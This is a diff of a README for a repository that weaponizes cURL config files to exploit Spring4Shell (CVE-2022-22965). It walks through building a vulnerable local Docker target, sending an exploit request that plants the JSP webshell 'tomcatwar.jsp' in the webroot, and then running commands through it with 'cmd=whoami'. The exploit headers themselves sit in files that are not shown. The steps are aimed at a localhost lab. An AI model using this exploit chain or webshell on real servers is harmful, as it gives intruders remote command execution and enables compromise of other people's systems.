@@ -3,7 +3,7 @@ Weaponzing cURL configs to exploit Spring4Shell (CVE-2022-22965)
 
 
 ## cURL? Really?
-Yup. I hadn't seen this method posted anywhere, so just wanted to document. Most of the heavy lifting had already been done, I just uniquely combined things with my own twist into this repo. 
+Yup. I hadn't seen this method posted anywhere, so just wanted to document. Most of the heavy lifting had already been done, I just put my own twist on things. 
 
 
 ### Quick Setup
@@ -16,17 +16,18 @@ Yup. I hadn't seen this method posted anywhere, so just wanted to document. Most
 docker image build -t retro/stupidrumor . && docker container run -it --publish 8080:8080 retro/stupidrumor
 ```
 
-3. Use cURL to upload your WAR. The following command will read from the local `requests.txt` file. The `request.txt` contains request configurations we want cURL to use, namely the specific headers we need to exploit the vulnerable application. You'll notice the last line `data-binary = "@body.txt"` too, which is our POST body:
+3. Use cURL to upload your WAR. The following command will read from the local `requests.txt` file. It contains request configurations we want cURL to use, namely the specific headers we need to prime the application for exploitation. You'll notice the last line `data-binary = "@body.txt"` too, which is the local file containing our POST body:
 
 ```
 curl --config request.txt http://localhost:8080/stupidRumor_war/index
 ``` 
    
-**Note:** I've included proxy support within the cURL configs, so we can send our requests through a transparent application proxy (Burp). This happens over port 8081, so make sure to adjust your proxy details as necessary. This is mostly for troubleshooting, but handy to have in your Repeater nonetheless :)
+**Note:** I've included proxy support within the cURL configs, so we can send our requests through a transparent application proxy (Burp). This happens over port 8081, so make sure to adjust accordingly. This is mostly for troubleshooting, but handy to have in your Repeater nonetheless :)
    
-4. Once the cURL command is sent, the webshell (`tomcatwar.jsp`) will be uploaded to the webroot (`stupidRumor_war/`), which means you can access it here in a browser if you want: `stupidRumor_war/tomcatwar.jsp?`
+4. Once the cURL command is sent, the webshell `tomcatwar.jsp` will be uploaded to the webroot at `stupidRumor_war/`. If you want, you can access the shell in a browser.
 
-5. But we're using cURL, so now issue the second cURL request:  
+5. But we're using cURL, so issue the second request to run your commands:  
+
 ```
 curl 'http://localhost:8080/stupidRumor_war/tomcatwar.jsp?pwd=j&cmd=whoami' --output -
 ``` 
